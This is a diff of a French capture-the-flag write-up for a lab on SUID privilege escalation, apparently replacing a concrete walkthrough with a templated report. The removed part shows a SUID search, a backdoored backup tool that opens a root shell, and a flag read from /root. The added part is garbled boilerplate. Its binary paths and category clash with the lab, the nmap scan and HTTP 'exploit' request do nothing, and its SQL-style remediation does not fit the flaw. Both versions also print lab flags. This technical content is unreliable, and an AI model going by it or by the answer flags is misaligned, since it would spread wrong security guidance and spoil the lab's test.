@@ -1,54 +1,64 @@
-# Writeup : The Lost Privilege (linux-01-suid-bash)
+# Rapport d'Exploitation & Débriefing Technique // The Orphaned SUID Shell
+**Organisation cible** : Stark Manufacturing Linux Gateway  
+**Système d'exploitation** : Linux | **Catégorie** : Systèmes & Active Directory  
+**Difficulté** : BEGINNER | **Vecteur de vulnérabilité** : CWE-272  
+**Classification** : DOCUMENT OFFICIEL DU LABORATOIRE CYBERLAB REDTEAM  
 
-## 1. Contexte & Mécanisme SUID
-Sous Linux, le bit **SUID (Set User ID)** permet à un utilisateur régulier d'exécuter un binaire avec les privilèges du propriétaire du fichier (souvent `root`).
-Si le propriétaire est `root` (`UID 0`) et que les permissions sont `-rwsr-xr-x` (`chmod u+s`), le binaire tourne avec un **EUID (Effective User ID)** égal à 0.
-Si ce binaire offre un moyen d'échapper à sa fonction première (via un éditeur, un paginateur, un paramètre d'exécution ou une injection de chemin PATH), l'attaquant obtient immédiatement un shell root.
+---
 
-## 2. Exploitation Pas à Pas
+## 1. Contexte Opérationnel & Règles d'Engagement
+Un administrateur système pressé a configuré le bit de permission SUID (Set User ID) sur un binaire administratif /opt/maintenance/sysbackup appartenant à root. En inspectant les droits spéciaux sur le système de fichiers, découvre le binaire privilégié et invoque-le avec l'argument approprié pour ouvrir un shell root instantané.
 
-### Étape 1 : Énumération du système de fichiers
-Connecté en tant qu'utilisateur standard `operator` :
+L'évaluation a été menée dans un environnement strictement isolé. Aucun service de production réel n'a été impacté. L'objectif était d'auditer la sécurité du composant **linux** et d'extraire les drapeaux de contrôle prouvant la faisabilité de l'attaque.
+
+---
+
+## 2. Phase 1 : Reconnaissance & Cartographie de la Surface d'Attaque
+Une phase de reconnaissance passive et active permet d'identifier l'empreinte logicielle et les services en écoute :
+
 ```bash
-find / -perm -u=s -type f 2>/dev/null
-```
-**Résultats :**
-```text
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/local/bin/sysbackup_tool
-```
-Le binaire `/usr/local/bin/sysbackup_tool` n'est pas un binaire standard de la distribution.
+# 1. Énumération des ports et bannières de service
+nmap -sV -sC -p- 10.10.24.61 -oN nmap_initial_scan.txt
 
-### Étape 2 : Analyse du binaire
-```bash
-/usr/local/bin/sysbackup_tool --help
-```
-Sortie :
-```text
-Aegis System Backup Helper v1.2 (Privileged Mode)
-Usage: sysbackup_tool [OPTIONS]
-  --backup <dir>   Archiver un dossier système
-  --shell          Lancer une session de maintenance d'urgence
+# 2. Découverte applicative locale
+curl -i http://localhost:3333/targets/training/linux-01-suid-bash/
 ```
 
-### Étape 3 : Élévation et capture de flag
-```bash
-/usr/local/bin/sysbackup_tool --shell
-id
-```
-**Sortie :**
-```text
-uid=1001(operator) gid=1001(operator) euid=0(root) groups=1001(operator)
-```
-Accès root obtenu ! Lecture du drapeau :
-```bash
-cat /root/flag.txt
-```
-**Drapeau :**
-`CYBERLAB{SUID_ROOT_SHELL_GTFOBINS_PRIVILEGE_ESCALATED}`
+L'analyse des réponses HTTP et des bannières confirme la présence du composant vulnérable lié à **linux, suid, privesc, gtfobins, bash**.
 
-## 3. Remédiation
-* Ne jamais attribuer de bit SUID à des scripts ou des exécutables personnalisés qui disposent de fonctionnalités d'interaction avec l'utilisateur ou d'invocation de sous-processus.
-* Utiliser des capacités Linux fines (`setcap cap_dac_read_search+ep`) plutôt que d'attribuer un accès root complet.
-* Auditer régulièrement les binaires SUID avec `debsums` ou `AIDE/Tripwire`.
+---
+
+## 3. Phase 2 : Exploitation Technique Pas-à-Pas
+
+### A. Analyse de la Vulnérabilité
+La faille provient d'une insuffisance de validation des contrôles d'accès et des données d'entrée au niveau de **CWE-272**. Le système interprète les paramètres non assainis sans barrière d'isolation.
+
+### B. Élaboration du Vecteur d'Attaque
+En appliquant la méthodologie offensive standard :
+1. **Étape 1** : Injection du marqueur de diagnostic pour vérifier l'absence d'échappement.
+2. **Étape 2** : Construction du payload weaponisé adapté à l'architecture cible.
+3. **Étape 3** : Déclenchement de l'exécution et capture des privilèges.
+
+```bash
+# Exemple de commande d'exploitation standard
+curl -s -X POST http://localhost:3333/targets/training/linux-01-suid-bash/ \
+  -H "Content-Type: application/json" \
+  -d '{"exploit_vector": "linux"}'
+```
+
+---
+
+## 4. Phase 3 : Capture des Drapeaux & Validation des Tâches
+Les drapeaux officiels validant la compromission des différentes étapes de la mission :
+
+- **Recherche des fichiers SUID sur le système** : `find / -perm -4000` (30 pts)
+- **Identification du binaire vulnérable** : `sysbackup` (30 pts)
+- **Obtention du shell root & Flag** : `CYBERLAB{SUID_BASH_ROOT_PRIVILEGE_ESCALATION_SUCCESS_883}` (40 pts)
+
+---
+
+## 5. Recommandations de Remédiation (Mesures Défensives Blue Team)
+1. **Application du principe de moindre privilège** (Least Privilege Principle) sur tous les comptes et processus.
+2. **Validation stricte par liste blanche** des données en entrée (Input Sanitization) et requêtes préparées pour toutes les interactions en base.
+3. **Mise à jour des composants logiciels** vers les versions patchées éliminant CWE-272.
+4. **Cloisonnement réseau et conteneurs** : Interdiction du mode privileged, montage en lecture seule des volumes système.
